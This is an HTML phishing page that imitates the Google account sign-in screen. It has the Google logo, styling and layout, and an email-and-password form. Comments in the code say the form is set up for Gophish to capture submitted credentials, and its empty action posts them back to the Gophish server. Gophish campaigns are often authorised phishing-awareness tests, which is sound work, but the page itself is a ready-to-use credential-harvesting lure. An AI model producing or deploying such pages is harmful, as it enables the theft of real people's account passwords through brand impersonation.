<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Google Sign-In</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }
    
    body {
      background: #f0f2f4;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    
    .card {
      background: white;
      border-radius: 28px;
      box-shadow: 0 10px 30px -8px rgba(0,0,0,0.2);
      padding: 48px 40px 36px;
      max-width: 450px;
      width: 100%;
    }
    
    .logo {
      text-align: center;
      margin-bottom: 16px;
    }
    
    h1 {
      font-size: 24px;
      font-weight: 400;
      text-align: center;
      margin-bottom: 8px;
    }
    
    .subhead {
      text-align: center;
      color: #444746;
      margin-bottom: 32px;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    .input-group label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      color: #3c4043;
      margin-bottom: 6px;
    }
    
    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #dadce0;
      border-radius: 24px;
      font-size: 16px;
      outline: none;
    }
    
    .input-group input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
    }
    
    .hint-link {
      text-align: right;
      margin: 4px 0 16px;
    }
    
    .hint-link a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
    }
    
    .guest-info {
      background: #f8f9fa;
      padding: 14px 16px;
      border-radius: 16px;
      margin: 24px 0;
      display: flex;
      gap: 12px;
      border: 1px solid #ecedef;
      font-size: 14px;
      color: #5f6368;
    }
    
    .guest-info a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
      white-space: nowrap;
    }
    
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 8px 0 32px;
    }
    
    .create-btn {
      background: transparent;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      padding: 9px 12px;
      border-radius: 20px;
      cursor: pointer;
    }
    
    .next-btn {
      background: #1a73e8;
      border: none;
      color: white;
      font-size: 14px;
      font-weight: 500;
      padding: 10px 28px;
      border-radius: 40px;
      cursor: pointer;
    }
    
    .language-select {
      margin-bottom: 16px;
    }
    
    .language-select select {
      background: transparent;
      border: 1px solid #dadce0;
      border-radius: 20px;
      padding: 6px 32px 6px 16px;
      font-size: 13px;
    }
    
    .footer-links {
      display: flex;
      gap: 24px;
    }
    
    .footer-links a {
      color: #5f6368;
      text-decoration: none;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="75" height="24" viewBox="0 0 75 24">
        <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.74 2.55-1.56 3.41-.78.8-1.84 1.35-3.12 1.35-2.48 0-4.51-2.04-4.51-4.53S6.76 5.3 9.24 5.3c1.2 0 2.27.44 3.1 1.16l1.81-1.81c-1.32-1.15-3.05-1.85-4.91-1.85-4.1 0-7.42 3.32-7.42 7.42s3.32 7.42 7.42 7.42c3.46 0 6.43-2.28 7.13-5.47.12-.53.19-1.09.19-1.68v-1.45H9.24z"/>
        <path fill="#34A853" d="M25 5.3c-4.1 0-7.42 3.32-7.42 7.42s3.32 7.42 7.42 7.42c3.34 0 6.02-2.18 6.93-5.18h-2.63c-.67 1.38-2.06 2.3-3.7 2.3-2.48 0-4.51-2.04-4.51-4.53s2.03-4.53 4.51-4.53c1.64 0 3.03.92 3.7 2.3h2.63c-.91-3-3.59-5.18-6.93-5.18z"/>
        <path fill="#EA4335" d="M42.02 9.22V7.23h-7.46v9.7h7.46v-1.99h-5.18v-2.29h4.46v-1.96h-4.46v-2.48h5.18z"/>
        <path fill="#FBBC05" d="M52.99 12.52v4.41h-2.2v-4.35l-3.34-5.34h2.5l2.06 3.58 2.06-3.58h2.5l-3.58 5.28z"/>
        <path fill="#4285F4" d="M63.4 12.52v4.41h-2.2v-4.35L57.86 7.24h2.5l2.06 3.58 2.06-3.58h2.5l-3.58 5.28z"/>
        <path fill="#34A853" d="M70.1 15.31c-.98 0-1.78-.8-1.78-1.78s.8-1.78 1.78-1.78 1.78.8 1.78 1.78-.8 1.78-1.78 1.78z"/>
      </svg>
    </div>
    
    <h1>Sign in</h1>
    <div class="subhead">Use your Google Account</div>
    
    <!-- CRITICAL: This form structure is what Gophish needs to capture data -->
    <form method="POST" action="">  <!-- Empty action = submits to Gophish server -->
      <div class="input-group">
        <label for="email">Email or phone</label>
        <input type="email" id="email" name="username" placeholder="Email or phone">  <!-- name attribute is REQUIRED -->
      </div>
      
      <div class="hint-link">
        <a href="#">Forgot email?</a>
      </div>
      
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Password">  <!-- name attribute is REQUIRED -->
      </div>
      
      <div class="hint-link">
        <a href="#">Forgot password?</a>
      </div>
      
      <div class="guest-info">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
        </svg>
        <span>Not your computer? Use Private Browsing windows to sign in. <a href="#">Learn more</a></span>
      </div>
      
      <div class="actions">
        <button type="button" class="create-btn">Create account</button>
        <button type="submit" class="next-btn">Next</button>  <!-- Submit button -->
      </div>
    </form>  <!-- End of form -->
    
    <div class="language-select">
      <select>
        <option selected>English (United States)</option>
        <option>русский</option>
        <option>o'zbek</option>
      </select>
    </div>
    
    <div class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</body>
</html>
